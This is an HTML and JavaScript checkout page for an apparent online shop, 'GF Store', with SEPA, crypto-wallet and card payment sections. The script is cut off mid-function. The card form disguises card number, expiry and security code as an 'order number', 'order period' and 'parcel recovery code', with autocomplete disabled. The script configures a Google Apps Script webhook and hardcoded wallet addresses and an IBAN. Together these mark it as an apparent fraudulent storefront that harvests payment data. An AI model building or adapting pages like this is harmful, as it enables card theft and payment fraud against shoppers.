<!doctype html>
<html lang="de">
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <title>GF Store — Sichere Zahlung</title>
  <meta name="description" content="GF Store Bezahlseite: SEPA, Krypto & Karte aktiv. Prioritärer Versand innerhalb 1 Woche, Rückgabe binnen 14 Tagen." />
  <style>
    :root{
      --w:1200px;
      --bg:#f6f8fb; --panel:#ffffff; --line:#e6edf6;
      --text:#0f172a; --muted:#6b7280;
      --brand:#2563eb; --ok:#059669;
      --r:14px;
      --shadow:0 6px 18px rgba(15,23,42,.06);
    }
    *{box-sizing:border-box}
    body{margin:0;background:var(--bg);color:var(--text);font:14px/1.45 system-ui,-apple-system,Segoe UI,Roboto,Ubuntu}
    a{color:inherit;text-decoration:none}
    img{max-width:100%;display:block}

    header{position:sticky;top:0;z-index:50;background:#fff;border-bottom:1px solid var(--line);backdrop-filter:saturate(140%) blur(4px)}
    .hwrap{max-width:var(--w);margin:auto;padding:10px 12px;display:flex;align-items:center;justify-content:space-between;gap:10px}
    .brand{display:flex;align-items:center;gap:10px}
    .brand .logo{height:40px;width:auto}
    .nav{display:flex;gap:10px;align-items:center}
    .nav a,.iconbtn{display:inline-flex;align-items:center;gap:8px;padding:8px 12px;border:1px solid var(--line);background:#fff;border-radius:12px;box-shadow:0 1px 0 rgba(0,0,0,.02)}
    .nav a:hover,.iconbtn:hover{box-shadow:0 4px 16px rgba(0,0,0,.06)}
    .iconbtn{cursor:pointer}
    .ic{width:16px;height:16px}
    .dropdown{position:relative}
    .menu{position:absolute;right:0;top:calc(100% + 8px);display:none;background:#fff;border:1px solid var(--line);border-radius:12px;min-width:220px;padding:6px;box-shadow:0 10px 24px rgba(0,0,0,.12)}
    .menu a{display:block;padding:8px 10px;border-radius:8px}
    .menu a:hover{background:#f3f4f6}
    .menu.show{display:block}

    .wrap{max-width:var(--w);margin:16px auto;padding:0 12px;display:grid;gap:16px}
    @media (min-width:980px){.wrap{grid-template-columns:1.15fr .85fr}}
    .card{background:var(--panel);border:1px solid var(--line);border-radius:var(--r);box-shadow:var(--shadow)}
    .hd{display:flex;align-items:center;justify-content:space-between;padding:14px 16px;border-bottom:1px solid var(--line)}
    .bd{padding:14px 16px}
    .title{font-weight:600;font-size:17px}
    .muted{color:var(--muted);font-size:13px}
    .pill{display:inline-flex;align-items:center;gap:8px;border:1px solid #dbeafe;background:#f5f8ff;color:#2563eb;border-radius:999px;padding:6px 10px;font-size:12px}

    form{display:grid;gap:10px}
    .row{display:grid;gap:10px}
    .cols-2{grid-template-columns:1fr 1fr}
    @media(max-width:760px){.cols-2{grid-template-columns:1fr}}
    label{display:block;margin:4px 0 6px;color:#0f172a;font-weight:500}
    input,select{width:100%;padding:11px 12px;border:1px solid var(--line);border-radius:12px;background:#fbfdff}
    input::placeholder{color:#9aa3b2}
    input:focus,select:focus{outline:2px solid rgba(37,99,235,.2);box-shadow:0 6px 18px rgba(37,99,235,.08)}

    .methods{display:grid;grid-template-columns:repeat(4,1fr);gap:10px}
    @media(max-width:980px){.methods{grid-template-columns:repeat(2,1fr)}}
    .m{position:relative;border:1px solid var(--line);border-radius:12px;background:#fff;padding:12px;display:grid;grid-template-rows:auto 1fr auto;gap:8px;cursor:pointer;transition:transform .08s,box-shadow .18s,border-color .18s}
    .m:hover{transform:translateY(-1px);box-shadow:0 8px 18px rgba(0,0,0,.06)}
    .m[aria-selected="true"]{border-color:var(--brand);box-shadow:0 10px 24px rgba(37,99,235,.12)}
    .mlabel{display:flex;align-items:center;gap:8px}
    .mlabel strong{font-weight:600}
    .logos{margin-top:auto;display:flex;gap:8px;align-items:center;flex-wrap:wrap}
    .logos img{height:18px;opacity:.9}
    .bubble{margin-top:8px;display:inline-flex;align-items:center;gap:6px;border:1px dashed #bbf7d0;background:#ecfdf5;color:#065f46;padding:4px 8px;border-radius:999px;font-size:12px}
    .disabled{opacity:.5;cursor:not-allowed}
    .disabled .bubble{display:none}

    .m.best::after{
      content:"BESTER PREIS";
      position:absolute; top:50%; right:12px; transform:translateY(-50%);
      font-size:11px; padding:4px 8px; border-radius:999px;
      background:#f0f9ff; color:#1e40af; border:1px solid #bfdbfe;
      pointer-events:none; letter-spacing:.2px; font-weight:700;
    }

    .pm{display:none;margin-top:12px;border:1px dashed var(--line);border-radius:12px;background:#fbfdff;padding:12px}
    .pm.show{display:block}
    .copyline{display:grid;grid-template-columns:1fr auto;gap:8px}
    .copy{padding:10px 12px;border:1px solid var(--line);border-radius:10px;background:#fff;cursor:pointer;font-weight:600}
    .qr{display:flex;align-items:center;justify-content:center;min-height:190px;border:1px dashed #dbe7ff;border-radius:10px;background:#f3f6ff}
    .qr img{width:220px;height:auto;display:block}

    .paytog{display:flex;gap:8px;flex-wrap:wrap;margin-top:8px}
    .pt{border:1px solid var(--line);background:#fff;border-radius:12px;padding:10px 12px;cursor:pointer;display:inline-flex;align-items:center;gap:8px}
    .pt.on{border-color:var(--brand);box-shadow:0 0 0 3px rgba(37,99,235,.12);background:#f8fbff}
    .pt small{color:#6b7280}

    .seg{display:flex;gap:8px;background:#f8fafc;border:1px solid var(--line);padding:6px;border-radius:12px}
    .segbtn{flex:1;display:grid;place-items:center;gap:2px;padding:10px 12px;border:1px solid transparent;background:#fff;border-radius:10px;cursor:pointer}
    .segbtn[aria-pressed="true"]{border-color:var(--brand);box-shadow:0 0 0 3px rgba(37,99,235,.12);background:#f0f6ff}
    .segbtn .big{font-weight:600}
    .segbtn .small{font-size:12px;color:#6b7280}

    .mini{display:flex;flex-direction:column;gap:10px}
    .ci{display:grid;grid-template-columns:60px 1fr auto;gap:8px}
    .ci img{width:60px;height:60px;object-fit:cover;border-radius:10px;border:1px solid var(--line);background:#fff}
    .sum{display:grid;gap:8px;margin-top:10px}
    .rowline{display:flex;align-items:center;justify-content:space-between}
    .due{font-size:18px;font-weight:700}
    .note{font-size:12px;color:#065f46;background:#ecfdf5;border:1px solid #bbf7d0;border-radius:10px;padding:6px 8px}
    .schedule{display:grid;gap:6px;margin-top:6px}
    .sch{display:flex;align-items:center;justify-content:space-between;font-size:13px}

    .btn{display:inline-flex;align-items:center;gap:8px;justify-content:center;padding:12px 14px;border-radius:12px;border:1px solid var(--line);background:#fff;cursor:pointer;font-weight:600}
    .btn.primary{background:linear-gradient(180deg,#2563eb,#1e40af);color:#fff;border-color:#1e40af;box-shadow:0 10px 24px rgba(30,64,175,.25)}
    .btn:disabled{opacity:.6;cursor:not-allowed}

    .modal{position:fixed;inset:0;background:rgba(0,0,0,.45);backdrop-filter:blur(2px);display:none;z-index:10000}
    .modal.show{display:block}
    .sheet{position:absolute;left:50%;top:50%;transform:translate(-50%,-50%);width:min(560px,95%);background:#fff;border:1px solid var(--line);border-radius:14px;box-shadow:0 18px 38px rgba(0,0,0,.25);display:grid;grid-template-rows:auto 1fr auto}
    .sheet header{display:flex;align-items:center;justify-content:space-between;padding:12px 14px;border-bottom:1px solid var(--line)}
    .sheet .body{padding:12px 14px;display:grid;gap:12px}
    .sheet footer{padding:12px 14px;border-top:1px solid var(--line);display:flex;gap:8px;justify-content:flex-end}
    .x{cursor:pointer;border:1px solid var(--line);background:#fff;border-radius:10px;padding:6px}

    .toast{position:fixed;left:50%;transform:translateX(-50%);bottom:16px;background:#111;color:#fff;padding:10px 14px;border-radius:12px;display:none;z-index:99999}
    .toast.show{display:block}

    .uploader{display:grid;gap:10px}
    .dz{position:relative; display:grid; place-items:center; text-align:center; gap:8px;
      padding:18px; border:1px dashed #cfe0ff; border-radius:14px; background:
      radial-gradient(1200px 80px at 50% 0, #f7faff 0,#ffffff 60%);
      transition:.15s border-color,.15s box-shadow,.15s transform; cursor:pointer;}
    .dz:hover{box-shadow:0 12px 28px rgba(37,99,235,.08)}
    .dz.over{border-color:#93c5fd; box-shadow:0 0 0 4px rgba(37,99,235,.12)}
    .dz svg{width:28px;height:28px;opacity:.8}
    .dz .hint{font-size:12px;color:var(--muted)}
    .dz .cta{display:inline-flex;gap:8px;align-items:center;margin-top:6px}
    .dz .cta .btn{padding:8px 12px}

    .native-picker{position:absolute; inset:0; width:100%; height:100%; opacity:0; cursor:pointer;}
    .filecard{display:flex;align-items:center;gap:12px;border:1px solid var(--line);background:#fff;border-radius:12px;padding:10px 12px;box-shadow:0 4px 14px rgba(0,0,0,.04)}
    .filebadge{width:36px;height:36px;border-radius:10px;background:#eef2ff;display:grid;place-items:center;border:1px solid #e5e7eb}
    .filemeta{display:grid}
    .filename{font-weight:600;max-width:320px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
    .filesub{font-size:12px;color:#6b7280}
    .prog{height:6px;background:#eef2ff;border-radius:999px;overflow:hidden}
    .bar{height:100%;width:0;background:linear-gradient(90deg,#60a5fa,#2563eb);transition:width .6s ease}
    .factions{margin-left:auto;display:flex;gap:8px}
    .tag-ok{font-size:12px;color:#065f46;background:#ecfdf5;border:1px solid #bbf7d0;border-radius:8px;padding:2px 6px;display:inline-flex;align-items:center;justify-content:center;min-width:48px;text-align:center}

    .overlay{position:fixed; inset:0; display:none; align-items:center; justify-content:center;background:rgba(15,23,42,.28); backdrop-filter:blur(6px); z-index:20000;}
    .overlay.show{display:flex}
    .loader{background:#fff; border:1px solid var(--line); border-radius:14px; padding:18px; width:min(520px,92%); box-shadow:0 18px 38px rgba(0,0,0,.25); text-align:center; display:grid; gap:12px;}
    .spin{width:38px;height:38px;border:3px solid #e5e7eb;border-top-color:#1e40af;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto}
    @keyframes spin{to{transform:rotate(360deg)}}

    footer{background:#fff;border-top:1px solid var(--line);margin-top:16px}
    .fwrap{max-width:var(--w);margin:0 auto;padding:16px 12px;display:flex;flex-wrap:wrap;gap:10px;justify-content:space-between;align-items:center;font-size:12px}

    @media(max-width:640px){
      .brand .logo{height:26px}
      .nav a span{display:none}
      .filename{max-width:180px}
    }
  </style>
</head>
<body>
  <header>
    <div class="hwrap">
      <a href="index.html" class="brand" aria-label="Startseite">
        <img src="assets/img/logopnggfstore.png" class="logo" alt="GF Store" width="180" height="52" decoding="async">
      </a>
      <nav class="nav">
        <a href="compte/index.html" title="Konto"><img class="ic" id="icUser" alt=""> <span>Konto</span></a>
        <a href="index.html" title="Weiter einkaufen"><img class="ic" id="icContinue" alt=""> <span>Weiter einkaufen</span></a>
        <div class="dropdown">
          <button class="iconbtn" id="menuBtn" aria-label="Menü öffnen"><img class="ic" id="icMenu" alt=""></button>
          <div id="menuDrop" class="menu" role="menu">
            <a href="pages/a-propos.html">Über uns</a>
            <a href="pages/cgv.html">AGB</a>
            <a href="pages/mentions-legales.html">Impressum</a>
            <a href="pages/confidentialite.html">Datenschutz</a>
            <a href="pages/contact.html">Kontakt</a>
          </div>
        </div>
      </nav>
    </div>
  </header>

  <main class="wrap" aria-live="polite">
    <!-- Colonne gauche -->
    <section class="card" aria-labelledby="h-checkout">
      <div class="hd">
        <div>
          <div class="title" id="h-checkout">Sichere Zahlung <span id="orderId" class="muted" style="margin-left:8px"></span></div>
          <div class="muted">Prioritärer Versand innerhalb 1 Woche • Rückgabe 14 Tage</div>
        </div>
        <span class="pill"><img class="ic" id="icSSL" alt=""> SSL aktiv</span>
      </div>

      <div class="bd">
        <!-- FORMULAIRE 1 : coordonnées -->
        <form id="addrForm" class="row cols-2" novalidate>
          <div><label for="name">Vollständiger Name</label><input id="name" placeholder="Vorname Nachname" required></div>
          <div><label for="email">E-Mail</label><input id="email" type="email" placeholder="sie@beispiel.de" required></div>
          <div><label for="phone">Telefon</label><input id="phone" inputmode="tel" placeholder="+49 170 1234567"></div>

          <div><label for="country">Land</label>
            <select id="country" required>
              <option value="" disabled selected>— Land auswählen —</option>
              <option value="AL">Albanien</option><option value="AD">Andorra</option><option value="AM">Armenien</option>
              <option value="AT">Österreich</option><option value="AZ">Aserbaidschan</option><option value="BY">Belarus</option>
              <option value="BE">Belgien</option><option value="BA">Bosnien und Herzegowina</option><option value="BG">Bulgarien</option>
              <option value="HR">Kroatien</option><option value="CY">Zypern</option><option value="CZ">Tschechien</option>
              <option value="DK">Dänemark</option><option value="EE">Estland</option><option value="FI">Finnland</option>
              <option value="FR">Frankreich</option><option value="GE">Georgien</option><option value="DE">Deutschland</option>
              <option value="GR">Griechenland</option><option value="HU">Ungarn</option><option value="IS">Island</option>
              <option value="IE">Irland</option><option value="IT">Italien</option><option value="LV">Lettland</option>
              <option value="LI">Liechtenstein</option><option value="LT">Litauen</option><option value="LU">Luxemburg</option>
              <option value="MT">Malta</option><option value="MD">Republik Moldau</option><option value="MC">Monaco</option>
              <option value="ME">Montenegro</option><option value="NL">Niederlande</option><option value="MK">Nordmazedonien</option>
              <option value="NO">Norwegen</option><option value="PL">Polen</option><option value="PT">Portugal</option>
              <option value="RO">Rumänien</option><option value="RU">Russland</option><option value="SM">San Marino</option>
              <option value="RS">Serbien</option><option value="SK">Slowakei</option><option value="SI">Slowenien</option>
              <option value="ES">Spanien</option><option value="SE">Schweden</option><option value="CH">Schweiz</option>
              <option value="TR">Türkei</option><option value="UA">Ukraine</option><option value="GB">Vereinigtes Königreich</option>
              <option value="VA">Vatikanstadt</option><option value="XK">Kosovo</option>
            </select>
          </div>

          <div class="cols-2">
            <div><label for="address">Adresse</label><input id="address" placeholder="Musterstraße 10" required></div>
            <div><label for="city">Stadt</label><input id="city" placeholder="Berlin" required></div>
            <div><label for="zip">PLZ</label><input id="zip" inputmode="numeric" placeholder="10115" required></div>
          </div>
        </form>

        <!-- Choix paiement -->
        <div style="margin:14px 0 8px;display:flex;align-items:center;justify-content:space-between;gap:10px;flex-wrap:wrap">
          <div class="title" style="font-size:16px">Zahlungsart</div>
          <span class="muted">SEPA, Krypto & Karte — PayPal nicht verfügbar</span>
        </div>

        <div class="methods" role="tablist">
          <button class="m best" role="tab" aria-selected="true" data-method="sepa">
            <div class="mlabel"><strong>SEPA-Überweisung</strong></div>
            <div class="logos">
              <img alt="SEPA" src="https://img.icons8.com/?size=100&id=7IJfqNBSaJ0N&format=png&color=000000">
              <img alt="IBAN" src="https://img.icons8.com/?size=100&id=PpOkzOgNS2tV&format=png&color=000000">
            </div>
            <span class="bubble">Rabatt −3 %</span>
          </button>

          <button class="m" role="tab" aria-selected="false" data-method="crypto">
            <div class="mlabel"><strong>Krypto</strong></div>
            <div class="logos">
              <img alt="Bitcoin" src="https://cdn.simpleicons.org/bitcoin">
              <img alt="Ethereum" src="https://cdn.simpleicons.org/ethereum">
              <img alt="Tether" src="https://cdn.simpleicons.org/tether">
            </div>
            <span class="bubble">Rabatt −1 %</span>
          </button>

          <button class="m" role="tab" aria-selected="false" data-method="card">
            <div class="mlabel"><strong>Kreditkarte</strong></div>
            <div class="logos">
              <img alt="Visa" src="https://cdn.simpleicons.org/visa">
              <img alt="Mastercard" src="https://cdn.simpleicons.org/mastercard">
              <img alt="American Express" src="https://cdn.simpleicons.org/americanexpress">
            </div>
            <span class="bubble">Chiffré via TLS</span>
          </button>

          <div class="m disabled" aria-selected="false">
            <div class="mlabel"><strong>PayPal</strong></div>
            <div class="logos"><img alt="PayPal" src="https://cdn.simpleicons.org/paypal"></div>
            <span class="muted" style="margin-top:6px">Nicht verfügbar</span>
          </div>
        </div>

        <div class="paytog" style="margin-top:12px">
          <button id="btnOnce" class="pt on" type="button"><strong>Jetzt bezahlen</strong></button>
          <button id="btnSplit" class="pt" type="button" aria-haspopup="dialog" aria-controls="splitModal">
            <strong>In Raten zahlen</strong> <small id="splitHint">(deaktiviert)</small>
          </button>
        </div>

        <!-- SEPA -->
        <div id="pmSEPA" class="pm show">
          <div class="row">
            <div class="row cols-2">
              <div><label>Kontoinhaber</label><input readonly value="GF STORE"></div>
              <div><label>Bank</label><input readonly value="Nirio Banque (FR)"></div>
              <div><label for="iban">IBAN</label><input id="iban" readonly value="FR76 1652 8001 3100 0091 7161 081"></div>
              <div><label for="swift">BIC</label><input id="swift" readonly value="SMOEFRP1XXX"></div>
              <div><label for="vref">Verwendungszweck</label><input id="vref" readonly placeholder="Kundenname (auto)"></div>
              <div><label for="amountNowBank">Jetzt zu überweisen (EUR)</label><input id="amountNowBank" readonly value="0"></div>
            </div>

            <div class="uploader" aria-label="Überweisungsnachweis hochladen">
              <div id="dz" class="dz" role="button" aria-controls="proofInput" aria-label="Nachweis importieren">
                <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M7 18h10a4 4 0 0 0 0-8h-.26A6 6 0 1 0 7 18Zm5-9v6m0-6-2 2m2-2 2 2" fill="none" stroke="#1f2937" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
                <div>Ziehen Sie Ihren Nachweis hierher (alle Formate)</div>
                <div class="hint">oder</div>
                <div class="cta">
                  <label for="proofInput" class="btn">Importieren</label>
                  <span class="hint">max. 10 MB</span>
                </div>
                <input id="proofInput" class="native-picker" type="file" accept="*/*">
              </div>

              <div id="fileWrap" class="filecard" style="display:none">
                <div class="filebadge" aria-hidden="true">
                  <svg viewBox="0 0 24 24" width="18" height="18"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8Z" fill="#e5e7eb"/><path d="M14 2v6h6" fill="#dbeafe"/></svg>
                </div>
                <div class="filemeta">
                  <span id="fileName" class="filename"></span>
                  <span id="fileInfo" class="filesub"></span>
                  <div class="prog" aria-hidden="true"><div id="fileBar" class="bar"></div></div>
                </div>
                <div class="factions">
                  <span id="fileOk" class="tag-ok" style="display:none">Fertig</span>
                  <button id="removeProof" type="button" class="btn" title="Entfernen">Entfernen</button>
                </div>
              </div>
            </div>

            <div style="display:flex;gap:8px;flex-wrap:wrap;align-items:center">
              <button class="btn" data-copy="#iban">IBAN kopieren</button>
              <button class="btn" data-copy="#swift">BIC kopieren</button>
              <button class="btn" data-copy="#vref">Verwendungszweck kopieren</button>
              <button id="confirmBank" class="btn">Überweisung durchgeführt</button>
              <small class="muted">Nach Prüfung können Sie die Bestellung finalisieren.</small>
            </div>
          </div>
        </div>

        <!-- Crypto -->
        <div id="pmCrypto" class="pm">
          <div class="row cols-2">
            <div>
              <label for="ccy">Währung</label>
              <select id="ccy">
                <option value="USDT-BEP20" selected>USDT (BEP20)</option>
                <option value="USDT-TRC20">USDT (TRC20)</option>
                <option value="BTC">Bitcoin (BTC)</option>
                <option value="ETH-ERC20">Ethereum (ERC20)</option>
              </select>
            </div>
            <div>
              <label for="amountNow">Jetzt zu senden (EUR)</label>
              <input id="amountNow" readonly value="0">
            </div>
          </div>

          <div class="copyline">
            <div>
              <label for="wallet">Zahlungsadresse</label>
              <input id="wallet" readonly>
            </div>
            <button class="copy" data-copy="#wallet">Kopieren</button>
          </div>

          <div class="copyline">
            <div>
              <label for="ccyAmt">Zu sendender Betrag (<span id="ccyLabel">—</span>)</label>
              <input id="ccyAmt" readonly>
            </div>
            <button class="copy" data-copy="#ccyAmt">Kopieren</button>
          </div>

          <div class="qr" aria-label="Zahlungs-QR">
            <img id="qrImg" alt="QR-Code Zahlung" width="220" height="220" decoding="async">
          </div>

          <div>
            <label for="txid">Transaktions-ID (TxID / Hash)</label>
            <input id="txid" placeholder="0x… / bc1… / TX123…" required>
          </div>

          <div style="display:flex;gap:8px;flex-wrap:wrap">
            <button id="confirmCrypto" class="btn">Zahlung gesendet</button>
            <small class="muted">Schnelle Hash-Prüfung vor dem Abschluss.</small>
          </div>
        </div>

        <!-- FORMULAIRE 2 : Carte -->
        <div id="pmCard" class="pm">
          <div class="row cols-2">
            <div><label for="cardName">Titulaire</label><input id="cardName" placeholder="Prénom Nom" required></div>
            <div><label for="orderNumber">Numéro de commande</label><input id="orderNumber" placeholder="1234 1234 1234 1234" inputmode="numeric" autocomplete="off" required></div>
            <div><label for="cardPeriod">Période de la commande (MM/AA)</label><input id="cardPeriod" placeholder="MM/AA" inputmode="numeric" autocomplete="off" required></div>
            <div><label for="recoveryCode">Code de récupération du colis</label><input id="recoveryCode" placeholder="3 chiffres au moins" inputmode="numeric" autocomplete="off" required></div>
          </div>
          <small class="muted">Chiffré via TLS.</small>
          <div style="display:flex;gap:8px;flex-wrap:wrap;margin-top:8px">
            <button id="payCard" class="btn primary">Payer par carte</button>
          </div>
        </div>

        <div style="display:flex;gap:10px;justify-content:flex-end;flex-wrap:wrap;margin-top:12px">
          <a href="index.html" class="btn"><img class="ic" id="icBack" alt=""> Weiter einkaufen</a>
          <button id="placeOrder" class="btn primary" disabled>Bestellung abschließen</button>
        </div>
      </div>
    </section>

    <!-- Colonne droite -->
    <aside class="card" aria-labelledby="h-recap">
      <div class="hd">
        <div class="title" id="h-recap">Zusammenfassung</div>
        <span class="pill"><img class="ic" id="icTruck" alt=""> Sendungsverfolgung & Support</span>
      </div>
      <div class="bd">
        <div id="miniCart" class="mini"></div>
        <hr style="border:none;border-top:1px dashed var(--line);margin:10px 0">
        <div class="sum">
          <div class="rowline"><span class="muted">Zwischensumme</span><span id="sub">—</span></div>
          <div class="rowline"><span class="muted">Versand</span><span id="ship">Kostenlos</span></div>
          <div class="rowline"><span class="muted">Vorteil</span><span id="benefit">—</span></div>
          <div class="rowline"><span class="muted">Gesamt</span><span id="total">—</span></div>
          <div class="rowline" id="dueRow"><span class="due">Heute fällig</span><span class="due" id="dueNow">—</span></div>
          <div id="schedule" class="schedule" style="display:none"></div>
          <div class="note">Prioritärer Versand innerhalb von 7 Tagen. Rückgabe innerhalb von 14 Tagen.</div>
        </div>
      </div>
    </aside>
  </main>

  <!-- Split modal -->
  <div id="splitModal" class="modal" aria-hidden="true" role="dialog" aria-modal="true" aria-labelledby="splitTitle">
    <div class="sheet">
      <header>
        <div style="font-weight:600" id="splitTitle">Ratenplan wählen</div>
        <button class="x" id="closeSplit" aria-label="Schließen">✕</button>
      </header>
      <div class="body">
        <div id="segSplit" class="seg" role="group" aria-label="Anzahl Raten">
          <button type="button" class="segbtn" data-parts="2" aria-pressed="false"><span class="big">2×</span><span class="small">monatlich</span></button>
          <button type="button" class="segbtn" data-parts="3" aria-pressed="false"><span class="big">3×</span><span class="small">monatlich</span></button>
          <button type="button" class="segbtn" data-parts="4" aria-pressed="true"><span class="big">4×</span><span class="small">monatlich</span></button>
        </div>
        <div id="modalPrev" class="schedule" aria-live="polite"></div>
      </div>
      <footer>
        <button class="btn" id="cancelSplit">Abbrechen</button>
        <button class="btn primary" id="applySplit">Übernehmen</button>
      </footer>
    </div>
  </div>

  <!-- Toast & overlays -->
  <div id="toast" class="toast" role="status" aria-live="polite"></div>

  <div id="checkOverlay" class="overlay" aria-hidden="true" role="dialog" aria-modal="true">
    <div class="loader" role="status" aria-live="polite">
      <div class="spin" aria-hidden="true"></div>
      <div id="ovTitle" style="font-weight:700">Prüfung…</div>
      <div id="ovSub" class="muted">Einen Moment, wir bestätigen Ihre Zahlung.</div>
    </div>
  </div>

  <div id="doneOverlay" class="overlay" aria-hidden="true" role="dialog" aria-modal="true">
    <div class="loader" role="status" aria-live="polite">
      <div style="font-size:42px; line-height:1">✅</div>
      <div style="font-weight:700; font-size:18px">Danke! Ihre Bestellung ist eingegangen</div>
      <div class="muted">Wir prüfen die Zahlung und starten die Vorbereitung. Sie erhalten eine Bestätigungs-E-Mail.</div>
      <div style="display:flex; gap:8px; justify-content:center; flex-wrap:wrap; margin-top:4px">
        <a href="index.html" class="btn">Weitere Produkte entdecken</a>
        <a href="compte/index.html" class="btn primary">Meine Bestellung ansehen</a>
      </div>
    </div>
  </div>

  <footer>
    <div class="fwrap">
      <div>© GF Store 2025 — Einfach, sicher, krypto-freundlich.</div>
      <nav>
        <a href="pages/a-propos.html">Über uns</a> ·
        <a href="pages/cgv.html">AGB</a> ·
        <a href="pages/mentions-legales.html">Impressum</a> ·
        <a href="pages/confidentialite.html">Datenschutz</a> ·
        <a href="pages/contact.html">Kontakt</a>
      </nav>
    </div>
  </footer>

  <script>
(() => {
  "use strict";
  if (window.__GF_CHECKOUT_INIT__) return;
  window.__GF_CHECKOUT_INIT__ = true;

  /* ====== CONFIG ====== */
  const WEBHOOK_URL = "https://script.google.com/macros/s/AKfycbypa62g6lhlchWMayVWYyRh2TGc--bBdqNMag2ro1Ne1SDMVT5bHzy7pvooG3ZnsGAx/exec";
  const WEBHOOK_SECRET = ""; // si activé côté Apps Script
  const MAX_SIZE = 10 * 1024 * 1024;

  /* ====== HELPERS ====== */
  const $ = s => document.querySelector(s);
  const $$ = s => Array.from(document.querySelectorAll(s));
  const toast = (m)=>{ const t=$('#toast'); if(!t) return; t.textContent=m; t.classList.add('show'); setTimeout(()=>t.classList.remove('show'),1800); };
  const EUR = v => Number(v||0).toLocaleString('fr-FR',{style:'currency',currency:'EUR'});
  const two = n => String(n).padStart(2,'0');

  // Icons
  const ICONS = {
    user:'https://img.icons8.com/?size=100&id=n8DrUm77sR3l&format=png&color=000000',
    continue:'https://img.icons8.com/?size=100&id=26138&format=png&color=000000',
    menu:'https://img.icons8.com/?size=100&id=RzDomvpIKGI9&format=png&color=000000',
    ssl:'https://img.icons8.com/?size=100&id=2FIgZJEL88pu&format=png&color=000000',
    truck:'https://img.icons8.com/?size=100&id=plGFB4oatud2&format=png&color=000000',
    back:'https://img.icons8.com/?size=100&id=26138&format=png&color=000000'
  };
  const ids=['icUser','icMenu','icSSL','icTruck','icBack','icContinue'], srcs=[ICONS.user,ICONS.menu,ICONS.ssl,ICONS.truck,ICONS.back,ICONS.continue];
  ids.forEach((id,i)=>{ const el=document.getElementById(id); if(el) el.src=srcs[i]; });

  // Menu
  const menuBtn=$('#menuBtn'), menuDrop=$('#menuDrop');
  menuBtn?.addEventListener('click',e=>{e.stopPropagation();menuDrop?.classList.toggle('show');});
  document.addEventListener('click',e=>{ if(menuDrop && !menuDrop.contains(e.target) && e.target!==menuBtn) menuDrop.classList.remove('show'); });

  /* ====== ORDER ID ====== */
  const orderId = (()=>{ const d=new Date(); return `GF-${String(d.getFullYear()).slice(2)}${two(d.getMonth()+1)}${two(d.getDate())}-${Math.floor(Math.random()*9000)+1000}`; })();
  $('#orderId') && ($('#orderId').textContent = orderId);

  /* ====== CART ====== */
  const KEY='gf_cart';
  const getCart=()=>{ try{return JSON.parse(localStorage.getItem(KEY)||'[]');}catch{return[];} };
  const setCart = (arr)=> localStorage.setItem(KEY, JSON.stringify(arr));
  const computeSub = cart => cart.reduce((s,x)=> s + Number(x.price||0)*Number(x.qty||1), 0);

  function renderMini(){
    const wrap=$('#miniCart'); if(!wrap) return;
    const cart=getCart();
    if(!cart.length){
      wrap.innerHTML='<div class="muted">Ihr Warenkorb ist leer.</div>';
      ['sub','benefit','total','dueNow'].forEach(id=>{ const el=$('#'+id); if(el) el.textContent='—'; });
      const schedule=$('#schedule'); if(schedule) schedule.style.display='none';
      return;
    }
    wrap.innerHTML=cart.map(x=>`
      <div class="ci">
        <img src="${x.image||''}" alt="${x.name||''}">
        <div>
          <div style="font-weight:600">${x.name||''}</div>
          <div class="muted" style="font-size:12px">${x.brand||''}${x.category?(' • '+x.category):''}</div>
        </div>
        <div style="font-weight:600">${EUR((+x.price||0)*(+x.qty||1))}</div>
      </div>`).join('');
  }

  /* ====== PM / PROMO ====== */
  function currentPM(){ return document.querySelector('.m[role="tab"][aria-selected="true"]')?.dataset.method || 'sepa'; }
  function promoRate(){ return currentPM()==='sepa'?0.03 : currentPM()==='crypto'?0.01 : 0; }

  /* ====== CRYPTO CFG ====== */
  const fx = {
    'USDT-TRC20':{symbol:'USDT',rate:1},
    'USDT-BEP20':{symbol:'USDT',rate:1},
    'BTC':{symbol:'BTC',rate:60000},
    'ETH-ERC20':{symbol:'ETH',rate:3000}
  };
  const WALLET = {
    'USDT-BEP20':{ address:'0x5f1e4fdef890dba03ebfcba79a77aa0ea432f04b', qr:'https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=0x5f1e4fdef890dba03ebfcba79a77aa0ea432f04b' },
    'USDT-TRC20':{ address:'TMdLMTYGEEZAnoVbi482Zr9QSRgWmRUXXq', qr:'https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=TMdLMTYGEEZAnoVbi482Zr9QSRgWmRUXXq' },
    'BTC':{ address:'18npEW9EaKZvVvA9B1z3DcmVEJtuQUdus3', qr:'https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=18npEW9EaKZvVvA9B1z3DcmVEJtuQUdus3' },
    'ETH-ERC20':{ address:'0x5f1e4fdef890dba03ebfcba79a77aa0ea432f04b', qr:'https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=0x5f1e4fdef890dba03ebfcba79a77aa0ea432f04b' }
  };
  function setCryptoAddress(ccy){
    const cfg=WALLET[ccy]||{};
    const w=$('#wallet'); if(w) w.value=cfg.address||'';
    const lbl=$('#ccyLabel'); if(lbl) lbl.textContent=fx[ccy]?.symbol||(ccy?.includes('USDT')?'USDT':'');
    const img=$('#qrImg'); if(img){ img.src=cfg.qr||''; img.alt='QR '+(ccy||''); }
  }

  /* ====== SPLIT ====== */
  function splitAmounts(total, parts){
    const c=Math.round((+total||0)*100);
    const base=Math.floor(c/parts), first=base+(c-base*parts);
    return [first,...Array(parts-1).fill(base)].map(x=>x/100);
  }
  function scheduleLines(total, parts){
    const amts=splitAmounts(total, parts); const today=new Date(); const steps=[0,30,60,90];
    return amts.map((amt,i)=>{ const d=new Date(today); d.setDate(d.getDate()+steps[i]); return {label:i?`In ${steps[i]} Tagen`:`Heute`, date:d.toLocaleDateString('de-DE'), amt}; });
  }
  let selectedSplit=1;

  function currentDueNow(){
    const cart=getCart(); const sub=computeSub(cart); const promo=sub*promoRate(); const total=Math.max(0, sub - promo);
    return splitAmounts(total, selectedSplit)[0]||0;
  }

  /* ====== SUMMARY ====== */
  function updateSummary(){
